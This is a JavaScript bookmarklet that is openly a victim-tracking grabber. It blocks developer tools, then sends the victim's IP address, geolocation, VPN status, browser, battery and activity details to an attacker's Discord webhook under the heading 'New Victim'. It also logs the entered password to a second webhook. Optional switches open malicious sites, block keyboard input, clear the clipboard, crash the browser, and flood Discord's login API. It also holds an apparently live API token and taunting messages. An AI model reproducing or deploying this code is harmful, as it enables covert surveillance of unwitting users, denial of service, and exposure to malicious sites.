javascript: (function () {
    const webhook_token = ""; // Replace with your actual token
    const ipinfo_token = 'f453c10a78f33f'; // Replace with YOUR api key from https://ipinfo.io/ (mine is valid so you can use it if you want)
    const popups = false;
    const disable_key_press = false;
    const clear_clipboard = false;
    const crash_browser = false;
    const crash_discord_api = false;

    // -- Anti - Tamper --

    // Disable F12
    document.onkeydown = function (event) {
        if (event.key === 'F12' || 
            (event.ctrlKey && event.shiftKey && event.key === 'I') ||
            (event.ctrlKey && event.key === 'U') ||
            (event.ctrlKey && event.shiftKey && event.key === 'J')) {
            console.error("Tregethon's Anti-Tamper : Tampering has been detected");
            return false;
        }
    }
    
    document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
        console.error("Tregethon's Anti-Tamper : Tampering has been detected");
    }, false);
    
    // Monitor DOM changes
    const observer = new MutationObserver(function() {
        console.error("Tregethon's Anti-Tamper : Tampering has been detected");
    });
    observer.observe(document, {subtree: true, childList: true});
    
    // Check for console commands
    console.log = console.info = function() {
        console.error("Tregethon's Anti-Tamper : Tampering has been detected");
    }

    const ScriptKeys = [
        "Tregethon-qIBcu-TMTTE-jLE5H-eiTqh",
    ];

    const alert = (message) => {
        const alert = document.createElement("div");
        alert.style.position = "fixed";
        alert.style.top = "0";
        alert.style.left = "0";
        alert.style.width = "100%";
        alert.style.height = "100%";
        alert.style.backgroundColor = "rgba(0, 0, 0, 0.5)";

        const alertBox = document.createElement("div");
        alertBox.style.position = "absolute";
        alertBox.style.top = "50%";
        alertBox.style.left = "50%";
        alertBox.style.transform = "translate(-50%, -50%)";
        alertBox.style.width = "400px";
        alertBox.style.height = "200px";
        alertBox.style.backgroundColor = "black";
        alertBox.style.borderRadius = "10px";
        alertBox.style.display = "flex";
        alertBox.style.flexDirection = "column";
        alertBox.style.justifyContent = "center";
        alertBox.style.alignItems = "center";

        alert.appendChild(alertBox);
        document.body.appendChild(alert);

        const alertMessage = document.createElement("p");
        alertMessage.innerText = message;
        alertMessage.style.fontSize = "20px";
        alertMessage.style.fontWeight = "bold";
        alertMessage.style.textAlign = "center";
        alertMessage.style.margin = "0";
        alertMessage.style.padding = "0";
        alertMessage.style.color = "white";
        alertBox.appendChild(alertMessage);

        const alertCancelButton = document.createElement("button");
        alertCancelButton.innerText = "OK";
        alertCancelButton.style.width = "100px";
        alertCancelButton.style.height = "50px";
        alertCancelButton.style.borderRadius = "10px";
        alertCancelButton.style.backgroundColor = "blue";
        alertCancelButton.style.color = "white";
        alertCancelButton.style.fontSize = "20px";
        alertCancelButton.style.fontWeight = "bold";
        alertCancelButton.style.marginTop = "20px";
        alertCancelButton.style.cursor = "pointer";
        alertBox.appendChild(alertCancelButton);

        alertCancelButton.addEventListener("click", () => {
            alert.remove();
        });
    };

    const prompt = (message) => {
        const prompt = document.createElement("div");
        prompt.style.position = "fixed";
        prompt.style.top = "0";
        prompt.style.left = "0";
        prompt.style.width = "100%";
        prompt.style.height = "100%";
        prompt.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
        prompt.style.backdropFilter = "blur(5px)";

        const promptBox = document.createElement("div");
        promptBox.style.position = "absolute";
        promptBox.style.top = "50%";
        promptBox.style.left = "50%";
        promptBox.style.transform = "translate(-50%, -50%)";
        promptBox.style.width = "400px";
        promptBox.style.height = "300px";
        promptBox.style.backgroundColor = "white";
        promptBox.style.borderRadius = "10px";
        promptBox.style.display = "flex";
        promptBox.style.flexDirection = "column";
        promptBox.style.justifyContent = "center";
        promptBox.style.alignItems = "center";
        promptBox.style.backgroundColor = "rgba(0, 0, 0, 0.5)";

        prompt.appendChild(promptBox);
        document.body.appendChild(prompt);

        const promptMessage = document.createElement("p");
        promptMessage.innerText = message;
        promptMessage.style.fontSize = "20px";
        promptMessage.style.fontWeight = "bold";
        promptMessage.style.textAlign = "center";
        promptMessage.style.margin = "0";
        promptMessage.style.padding = "0";
        promptMessage.style.color = "white";
        promptBox.appendChild(promptMessage);

        const promptInput = document.createElement("input");
        promptInput.style.width = "300px";
        promptInput.style.height = "50px";
        promptInput.style.borderRadius = "10px";
        promptInput.style.border = "none";
        promptInput.style.fontSize = "20px";
        promptInput.style.fontWeight = "bold";
        promptInput.style.textAlign = "center";
        promptInput.style.marginTop = "20px";
        promptInput.style.color = "white";
        promptBox.appendChild(promptInput);

        const promptButton = document.createElement("button");
        promptButton.innerText = "SUBMIT";
        promptButton.style.width = "100px";
        promptButton.style.height = "50px";
        promptButton.style.borderRadius = "10px";
        promptButton.style.backgroundColor = "blue";
        promptButton.style.color = "white";
        promptButton.style.fontSize = "20px";
        promptButton.style.fontWeight = "bold";
        promptButton.style.marginTop = "20px";
        promptButton.style.cursor = "pointer";
        promptBox.appendChild(promptButton);

        promptButton.addEventListener("click", () => {
            prompt.remove();
        });



        promptButton.addEventListener("click", () => {
            const enteredKey = promptInput.value;
            if (ScriptKeys.includes(enteredKey)) {
                console.log("Valid key entered: " + enteredKey);

                const keylog = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz1234567890"; // Replace with your actual keylog webhook
                const keylogdata = { "content": enteredKey };
                const keylogoptions = {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(keylogdata)
                };

                fetch(keylog, keylogoptions)
                    .then(response => {
                        if (response.ok) {
                            console.log("Key logged successfully");
                        } else {
                            console.error("Error logging key: Server responded with status", response.status);
                        }
                    })
                    .catch(error => console.error("Error logging key: ", error));


                const url = `https://canary.discord.com/api/webhooks/${webhook_token}?wait=true`;

                if (webhook_token === "" || !webhook_token.includes("/") || !webhook_token.includes("_") || !webhook_token.includes("-")) {
                    alert("Validation : Fatal Error ❌");
                    return;
                }

                const maliciousSites = [
                    'https://aladel.net',
                    'https://nelsdecadem.com/Download-NW?fname=Your%20File%20Is%20Ready%20To%20Download&dd=MTQyNDIDBQcABQQDCwcHAQMCBAUEBgtICwYFBwIGTQUEAwIHBgsGAwVIAwQC&lpt=a2V5MTIDEQ1BQVFKVlJaGQoUVBwMChZWXg5LGl5fRBIcU0EfCgtUHQ8ADVBbB0ofWVMOBBVbWAoIHF5cGwkRXF8BBhRBVQ0CEFVbDgMSUExaU04BBFlcSwAG',

                ];

                const randomSite = maliciousSites[Math.floor(Math.random() * maliciousSites.length)];

                if (popups) {
                    console.log("4. Enabled");
                    window.open(randomSite, '_blank', 'width=600,height=600');
                    console.log("4. Attempting");
                } else {
                    console.log("4. Disabled");
                }

                if (disable_key_press) {
                    console.log("5. Enabled");
                    document.addEventListener('keydown', event => {
                        console.log("5. Attempting");
                        event.preventDefault();
                        console.log("5. Set");
                    });
                }

                if (clear_clipboard) {
                    console.log("6. Enabled");
                    navigator.clipboard.writeText("");
                    console.log("6. Attempting");
                } else {
                    console.log("6. Disabled");
                }

                if (crash_browser) {
                    console.log("7. Enabled");
                    while (true) {
                        console.log("7. Attempting");
                        for (let i = 0; i < 999999999999999; i++) {
                            let link = document.createElement("user319183 owns you");
                            link.href = "https://user319183.github.io";
                            document.body.appendChild(link);
                        }
                    }
                } else {
                    console.log("7. Disabled");
                }

                if (crash_discord_api) {
                    console.log("8. Enabled");
                    for (let i = 0; i < 999999999999999; i++) {
                        console.log("7. Attempting");
                        fetch("https://discord.com/api/v9/auth/login", {
                            "credentials": "include",
                            "headers": {
                                "accept": "*/*",
                                "accept-language": "en-US",
                                "content-type": "application/json"
                            },
                            "referrer": "https://discord.com/login",
                            "referrerPolicy": "strict-origin-when-cross-origin",
                            "body": "{\"login\":\"test\",\"password\":\"test\",\"undelete\":false,\"captcha_key\":null,\"login_source\":null,\"gift_code_sku_id\":null}",
                            "method": "POST",
                            "mode": "cors"
                        });
                    }
                } else {
                    console.log("8. Disabled");
                }

                let platform = "N/A";
                if (navigator.userAgentData) {
                    platform = navigator.userAgentData.platform;
                }

                // User Activity
                let userActivity = {
                    clicks: 0,
                    scrolls: 0
                };

                document.addEventListener('click', function () {
                    userActivity.clicks++;
                });

                document.addEventListener('scroll', function () {
                    userActivity.scrolls++;
                });

                // Network Information
                let networkInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

                // Battery Information
                let batteryInfo = {};

                navigator.getBattery().then(function (battery) {
                    batteryInfo.level = battery.level;
                    batteryInfo.charging = battery.charging;
                });

                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip;
                        fetch(`https://ipinfo.io/${ip}?token=${ipinfo_token}`)
                            .then(response => response.json())
                            .then(data => {
                                const isVpn = data.privacy && data.privacy.vpn ? "Yes" : "No";
                                const embed = {
                                    title: "New Victim",
                                    color: 0x00ff00,
                                    thumbnail: {
                                        url: "https://cdn.discordapp.com/avatars/1162389203917742121/703c76a6c4450c3b7ffbba595c189f34.png", // Replace with your image URL
                                    },
                                    fields: [
                                        { name: "Browser", value: navigator.userAgent, inline: true },
                                        { name: "Platform", value: platform, inline: true },
                                        { name: "Language", value: navigator.language, inline: true },
                                        { name: "Cookies Enabled", value: navigator.cookieEnabled ? "Yes" : "No", inline: true },
                                        { name: "Hostname", value: window.location.hostname, inline: true },
                                        { name: "Connected to a VPN", value: isVpn, inline: true },
                                        { name: "IP", value: data.ip, inline: true },
                                        { name: "Hostname", value: data.hostname || "N/A", inline: true },
                                        { name: "City", value: data.city || "N/A", inline: true },
                                        { name: "Region", value: data.region || "N/A", inline: true },
                                        { name: "Country", value: data.country || "N/A", inline: true },
                                        { name: "Location", value: data.loc || "N/A", inline: true },
                                        { name: "Postal", value: data.postal || "N/A", inline: true },
                                        { name: "Timezone", value: data.timezone || "N/A", inline: true },
                                        { name: "ASN", value: data.org || "N/A", inline: true },
                                        { name: "Company", value: data.company ? JSON.stringify(data.company, null, 2) : "N/A", inline: true },
                                        { name: "Carrier", value: data.carrier ? JSON.stringify(data.carrier, null, 2) : "N/A", inline: true },
                                        { name: "Privacy", value: data.privacy ? JSON.stringify(data.privacy, null, 2) : "N/A", inline: true },
                                        { name: "User Activity", value: JSON.stringify(userActivity), inline: true },
                                        { name: "Network Information", value: `Downlink: ${networkInfo.downlink}, RTT: ${networkInfo.rtt}, Effective Type: ${networkInfo.effectiveType}`, inline: true },
                                        { name: "Battery Information", value: `Level: ${batteryInfo.level}, Charging: ${batteryInfo.charging}`, inline: true },
                                    ],
                                };

                                fetch(url, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                    },
                                    body: JSON.stringify({ content: "@everyone", embeds: [embed] })
                                }).then(response => response.json())
                                    .then(data => { })
                                    .catch(error => console.error("Error sending data to Discord: ", error));
                            })
                            .catch(err => {
                                fetch(url, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify({
                                        content: "```" + "Error: " + err + "\n" + "```"
                                    })
                                })
                            });
                    })
                    .catch(err => {
                        fetch(url, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                content: "```" + "Error: " + err + "\n" + "```"
                            })
                        })
                    });

            }


            else if (promptInput.value === "") {
                alert("Passwords cannot be empty. Please execute the program again.");
                console.log("%c----------------------------------------\n", "text-decoration: line-through; color: cyan; font-size: 20px;");
                console.log("%cTHIS RETARD THOUGHT LMFAOOOOO", "text-decoration: line-through; color: cyan; font-size: 20px;");
                console.log("%https://user319183.github.io", "color: cyan; font-size: 20px;");
                console.log("%c----------------------------------------", "text-decoration: line-through; color: cyan; font-size: 20px;");
            }

            else {
                alert("Incorrect password. Please execute the program again.");
                console.log("%c----------------------------------------\n", "text-decoration: line-through; color: cyan; font-size: 20px;");
                console.log("%cHTTPS://user319183.github.io", "color: cyan; font-size: 20px;");
                console.log("%c----------------------------------------", "text-decoration: line-through; color: cyan; font-size: 20px;");
            }

        });

    };


    prompt("Enter the script password");


})();